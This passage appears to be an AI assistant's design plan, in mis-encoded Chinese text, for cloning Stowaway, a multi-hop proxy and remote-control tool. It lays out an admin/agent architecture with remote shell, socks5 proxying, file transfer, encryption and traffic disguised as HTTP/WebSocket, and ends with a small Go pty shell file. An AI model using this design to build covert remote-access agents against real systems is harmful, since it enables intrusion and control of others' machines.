| æ–‡ä»¶ä¼ è¾“   | è‡ªå®šä¹‰æµå¼åè®®æˆ–åŸºäº `io.Copy` + `bufio`                                 |

---

## ğŸ§± é¡¹ç›®ç»“æ„å»ºè®®

```bash
stowaway-clone/
â”œâ”€â”€ cmd/
â”‚   â”œâ”€â”€ stowaway_admin/
â”‚   â””â”€â”€ stowaway_agent/
â”œâ”€â”€ core/
â”‚   â”œâ”€â”€ transport/         # ä¼ è¾“å±‚ï¼ˆTCP/HTTP/WSï¼‰
â”‚   â”œâ”€â”€ crypto/            # åŠ å¯†æ¨¡å—ï¼ˆAES/TLSï¼‰
â”‚   â”œâ”€â”€ node/              # èŠ‚ç‚¹ç®¡ç†
â”‚   â”œâ”€â”€ protocol/          # å‘½ä»¤åè®®å®šä¹‰
â”‚   â”œâ”€â”€ filetransfer/      # æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½
â”‚   â”œâ”€â”€ tunnel/            # forward/backward/sshéš§é“
â”œâ”€â”€ pkg/
â”‚   â””â”€â”€ utils/
â”œâ”€â”€ script/                # reuse.pyã€è¾…åŠ©è„šæœ¬
â”œâ”€â”€ Makefile
â””â”€â”€ README.md
```

---

## ğŸ“Œ å¼€å‘å»ºè®®

1. **ä¼˜å…ˆå®ç°æœ€å°å¯ç”¨åŸå‹**ï¼š

   * Admin + å•ä¸ª Agentï¼ˆTCP é€šä¿¡ï¼Œshell åŠŸèƒ½ï¼‰
   * å†æ‰©å±•ï¼šSocks5, æ–‡ä»¶ä¼ è¾“, TLS, å¤šçº§è¿æ¥

2. **ä½¿ç”¨ protobuf/json å®šä¹‰æ¶ˆæ¯ç»“æ„ä½“**ï¼Œæ ‡å‡†åŒ–ä¼ è¾“å†…å®¹

3. **è®¾ç½®ç»Ÿä¸€çš„æ—¥å¿—è°ƒè¯•å¼€å…³**ï¼Œä¾¿äºæ’æŸ¥èŠ‚ç‚¹é—´é€šä¿¡é—®é¢˜

4. **å¤åˆ» listen/connect/sshtunnel å‘½ä»¤åŠŸèƒ½**æ—¶æ³¨æ„ CLI çŠ¶æ€ç®¡ç†ï¼ˆé¢æ¿åˆ‡æ¢ï¼‰

5. **é‡‡ç”¨ interface å°è£…ä¼ è¾“æŠ½è±¡å±‚**ï¼Œæ¯”å¦‚ `ConnWrapper`ï¼Œé€‚é… TCP/TLS/WSç­‰ä¸åŒç±»å‹è¿æ¥

---

## âœ… æœ€ç»ˆç›®æ ‡åŠŸèƒ½æ¸…å•ï¼ˆå¯¹ç…§åŸç‰ˆï¼‰

| åŠŸèƒ½               | å®ç°å»ºè®®                       |
| ---------------- | -------------------------- |
| å¤šçº§èŠ‚ç‚¹æ‹“æ‰‘           | æ ‘ç»“æ„ + IDæ˜ å°„                 |
| TCP/HTTP/WSæµé‡æ”¯æŒ  | ä½¿ç”¨ç»Ÿä¸€æµé‡å°è£…å±‚                  |
| TLS/AES-GCMåŠ å¯†    | `tls.Conn` / `cipher.AEAD` |
| è¿œç¨‹ shell / sshéš§é“ | `os/exec` + pty            |
| æ–‡ä»¶ä¸Šä¼ ä¸‹è½½           | `io.Copy` å®ç°åˆ†å—ä¼ è¾“           |
| socks5/httpä»£ç†    | `golang.org/x/net/proxy`   |
| ç«¯å£æ­£å‘/åå‘æ˜ å°„        | å»ºç«‹ç›‘å¬ç«¯å£+å¤šåç¨‹                 |
| è·¨å¹³å°ç¼–è¯‘æ”¯æŒ          | `Makefile + go build`      |
| CLIç•Œé¢ï¼ˆå¸¦è¡¥å…¨ï¼‰       | `go-prompt`                |
| ç«¯å£å¤ç”¨/IPTABLESæ•´åˆ  | æä¾›å¤–éƒ¨ Python è„šæœ¬è¾…åŠ©           |

---

å¦‚ä½ å¸Œæœ›æˆ‘ç›´æ¥ç”Ÿæˆä¸€ä¸ª **åˆå§‹æ¡†æ¶é¡¹ç›®** æˆ–æä¾›éƒ¨åˆ†ä»£ç æ¨¡å—ï¼ˆå¦‚ TLS é€šä¿¡ã€èŠ‚ç‚¹ç®¡ç†ã€ä¼ è¾“å°è£…ã€shell æ‰§è¡Œï¼‰ï¼Œæˆ‘å¯ä»¥ä¸ºä½ ç”Ÿæˆã€‚ä½ å¸Œæœ›æˆ‘å…ˆä»å“ªä¸ªæ¨¡å—å¼€å§‹ï¼Ÿ

å½“ç„¶å¯ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†**å¤åˆ» Stowaway çš„å¼€å‘è¿‡ç¨‹åˆ†ä¸ºäº”ä¸ªé˜¶æ®µ**ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½æ˜ç¡®ç›®æ ‡ã€é‡ç‚¹æ¨¡å—å’Œå»ºè®®æŠ€æœ¯æ ˆã€‚ä½ åªéœ€æŒ‰éƒ¨å°±ç­ï¼Œä¸€æ­¥æ­¥æ¥ï¼Œé¡¹ç›®å°±èƒ½é¡ºåˆ©æ¨è¿›ã€‚

---

## ğŸ§­ é˜¶æ®µåŒ–å¼€å‘è·¯çº¿

### âœ… **é˜¶æ®µä¸€ï¼šåŸºç¡€é€šä¿¡å±‚ä¸æœ€å°å¯ç”¨åŸå‹ (MVP)**

> **ç›®æ ‡**ï¼šå®ç° admin ä¸ agent ä¹‹é—´çš„ TCP é€šä¿¡å’Œå‘½ä»¤äº¤äº’ï¼Œæœ€ç®€å•çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆshellï¼‰

#### âœ” ä½ è¦å®ç°çš„åŠŸèƒ½ï¼š

* `admin`ï¼šç›‘å¬ç«¯å£ï¼Œç­‰å¾…è¿æ¥
* `agent`ï¼šä¸»åŠ¨è¿æ¥ admin
* åŒå‘ TCP é€šä¿¡ï¼šåŸºäºè‡ªå®šä¹‰åè®®ä¼ è¾“å‘½ä»¤å’Œç»“æœ
* æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼ˆç”¨ `bash -c`ï¼‰å¹¶è¿”å›ç»“æœ

#### ğŸ“ æ¨¡å—ç›®å½•å»ºè®®ï¼š

```bash
core/
  â”œâ”€â”€ protocol/       # åè®®å®šä¹‰ï¼ˆç»“æ„ä½“ + ç¼–ç /è§£ç ï¼‰
  â”œâ”€â”€ shell/          # æ‰§è¡Œå‘½ä»¤å¹¶è¿”å›è¾“å‡º
cmd/
  â”œâ”€â”€ stowaway_admin/
  â””â”€â”€ stowaway_agent/
```

#### ğŸ§± æŠ€æœ¯ç‚¹å»ºè®®ï¼š

* `net.Conn` åŸºç¡€é€šä¿¡ï¼ˆTCPï¼‰
* `encoding/gob` æˆ– `encoding/json` å®ç°ç®€å•çš„æ¶ˆæ¯ç»“æ„å°è£…
* `bufio.Reader/Writer` å®ç°æ•°æ®è¯»å†™
* `os/exec` è¿è¡Œå‘½ä»¤å¹¶æ”¶é›†è¾“å‡º

---

### âœ… **é˜¶æ®µäºŒï¼šå¤šçº§èŠ‚ç‚¹ä¸å‘½ä»¤ç³»ç»Ÿè®¾è®¡**

> **ç›®æ ‡**ï¼šagent å¯ä»¥ä½œä¸ºä¸­è½¬èŠ‚ç‚¹ï¼Œè¿æ¥æ–°çš„ agentï¼Œå½¢æˆ**æ ‘å½¢ç»“æ„**

#### âœ” ä½ è¦å®ç°çš„åŠŸèƒ½ï¼š

* æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥è½¬å‘æ•°æ®ç»™å®ƒçš„çˆ¶èŠ‚ç‚¹æˆ–å­èŠ‚ç‚¹
* `use` å‘½ä»¤åˆ‡æ¢æ§åˆ¶çš„èŠ‚ç‚¹
* `connect` å‘½ä»¤è®©ä¸€ä¸ªèŠ‚ç‚¹è¿æ¥å¦ä¸€ä¸ª agent

#### ğŸ“ æ–°å¢æ¨¡å—ï¼š

```bash
core/
  â”œâ”€â”€ node/           # èŠ‚ç‚¹ç»“æ„ä¸æ ‘ç®¡ç†
  â”œâ”€â”€ router/         # èŠ‚ç‚¹è·¯ç”±ä¸è½¬å‘
```

#### ğŸ§  æŠ€æœ¯ç‚¹ï¼š

* èŠ‚ç‚¹åˆ†é… IDï¼Œç»´æŠ¤çˆ¶å­ç»“æ„
* æ¯ä¸ªè¿æ¥éƒ½è¦æœ‰ metadataï¼šIDã€çˆ¶å­å…³ç³»ã€çŠ¶æ€
* è·¯ç”±æ¨¡å—å®ç°ä» admin -> node1 -> node2 -> node3 çš„é“¾å¼æ¶ˆæ¯è½¬å‘

---

### âœ… **é˜¶æ®µä¸‰ï¼šSocks5ã€Shellã€File ç­‰æœåŠ¡åŠŸèƒ½**

> **ç›®æ ‡**ï¼šå®ç° socks5 ä»£ç†ã€è¿œç¨‹ shellã€ä¸Šä¼ ä¸‹è½½ç­‰å…³é”®æœåŠ¡

#### âœ” ä½ è¦å®ç°çš„åŠŸèƒ½ï¼š

* è¿œç¨‹å‘½ä»¤æ‰§è¡Œäº¤äº’æ¨¡å¼
* æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½ï¼ˆå¯ç”¨åˆ†å—æµå¼ä¼ è¾“ï¼‰
* æœ¬åœ°å¯åŠ¨ socks5ï¼Œè½¬å‘ç»™ agent å‡ºå£è®¿é—®

#### ğŸ§  æŠ€æœ¯ç‚¹ï¼š

* `socks5`: ç”¨ç°æˆçš„ [xtaci/smux](https://github.com/xtaci/smux) æˆ–è‡ªå·±å®ç°ç®€å•ç‰ˆæœ¬
* shellï¼šåˆ©ç”¨ pty æä¾›äº¤äº’å¼ shell
* æ–‡ä»¶ï¼š`io.Copy` + metadata æè¿°ä¼ è¾“æµ

---

### âœ… **é˜¶æ®µå››ï¼šåŠ å¯†ä¸åè®®åˆ‡æ¢æ”¯æŒ**

> **ç›®æ ‡**ï¼šé€šä¿¡æ”¯æŒ TLSã€AES-GCMã€HTTP/WS æ¨¡å¼åˆ‡æ¢

#### âœ” ä½ è¦å®ç°çš„åŠŸèƒ½ï¼š

* TLS æ¡æ‰‹ï¼ˆåŒå‘ï¼‰
* AES-GCM åŠ å¯†è§£å¯†
* WS/HTTP ä¼ªè£…ä¸ºåº”ç”¨å±‚æµé‡ï¼ˆå¥—åœ¨ TCP ä¸Šï¼‰

#### ğŸ§  æŠ€æœ¯ç‚¹ï¼š

* TLSï¼š`crypto/tls`
* AESï¼š`crypto/aes`, `crypto/cipher`
* WebSocketï¼š`golang.org/x/net/websocket` æˆ– `nhooyr.io/websocket`

---

### âœ… **é˜¶æ®µäº”ï¼šCLIäº¤äº’ç•Œé¢ä¸å®Œæ•´æ§åˆ¶é¢æ¿**

> **ç›®æ ‡**ï¼šå®ç° admin çš„å®Œæ•´å‘½ä»¤è¡Œæ“ä½œç•Œé¢ï¼ˆæ”¯æŒè¡¥å…¨ã€å†å²è®°å½•ï¼‰

#### âœ” ä½ è¦å®ç°çš„åŠŸèƒ½ï¼š

* å‘½ä»¤é¢æ¿ (`help`, `use`, `listen`, `ssh`, `connect`, `upload`, `forward`, â€¦)
* é¢æ¿åˆ‡æ¢ï¼ˆadminä¸»ç•Œé¢ <=> nodeæ§åˆ¶é¢æ¿ï¼‰
* çŠ¶æ€è·Ÿè¸ªã€è¿›åº¦æ¡æ˜¾ç¤ºã€é”™è¯¯åé¦ˆ

#### æ¨èä½¿ç”¨çš„åº“ï¼š

* [c-bata/go-prompt](https://github.com/c-bata/go-prompt)ï¼šæä¾›é«˜çº§å‘½ä»¤è¡Œäº¤äº’
* æˆ–è€…è‡ªå·±å®ç°ï¼šç”¨ `bufio.Scanner` å¤„ç†å‘½ä»¤è¾“å…¥ + æ‰‹åŠ¨ dispatch å‘½ä»¤

---

## ğŸ”¨ å»ºè®®ä½ å…ˆåšçš„ç¬¬ä¸€æ­¥ï¼ˆç«‹å³å¯åšï¼‰

åˆ›å»ºæœ€å°å¯ç”¨åŸå‹ï¼Œå®ç°æœ€ç®€å•çš„ admin/agent TCP é€šä¿¡ + è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼š

```
admin: ./stowaway_admin -l 9999
agent: ./stowaway_agent -c 127.0.0.1:9999
```

1. æˆ‘å¯ä»¥ç›´æ¥ç»™ä½ å†™å‡ºè¿™ä¸ªéƒ¨åˆ†çš„å®Œæ•´ä»£ç ç»“æ„
2. ç„¶åä½ å°±å¯ä»¥åœ¨ç»ˆç«¯é‡Œçœ‹åˆ°ï¼šadmin å‘ä¸€æ¡å‘½ä»¤ï¼Œagent æ‰§è¡Œåè¿”å›ç»“æœ âœ…

---

æ˜¯å¦ç°åœ¨å°±ä»ã€Œ**é˜¶æ®µä¸€ï¼šadmin å’Œ agent çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ**ã€è¿™ä¸ªæœ€å°åŸå‹å¼€å§‹ï¼Ÿæˆ‘å¯ä»¥ç«‹åˆ»ç»™ä½ ç”Ÿæˆå¯¹åº”çš„ä»£ç æ¡†æ¶ã€‚ä½ å¸Œæœ›å…ˆå®ç°å“ªç§ï¼šå‘½ä»¤å•å‘è¿”å›ï¼Œè¿˜æ˜¯æŒç»­äº¤äº’å¼ shellï¼Ÿ

å­æ–‡ä»¶å¤¹ï¼š./script
æ–‡ä»¶ï¼š./test.go
å†…å®¹ï¼š
package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"

	"github.com/creack/pty"
)

func main() {
	cmd := exec.Command("bash", "-i")
	cmd.Env = append(os.Environ(), "TERM=xterm-256color")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		panic(err)
	}
	defer func() {
		_ = ptmx.Close()
		_ = cmd.Process.Kill()
	}()

	fmt.Fprintln(os.Stderr, "[*] Shell session started.")
	go io.Copy(ptmx, os.Stdin)
	io.Copy(os.Stdout, ptmx)
}


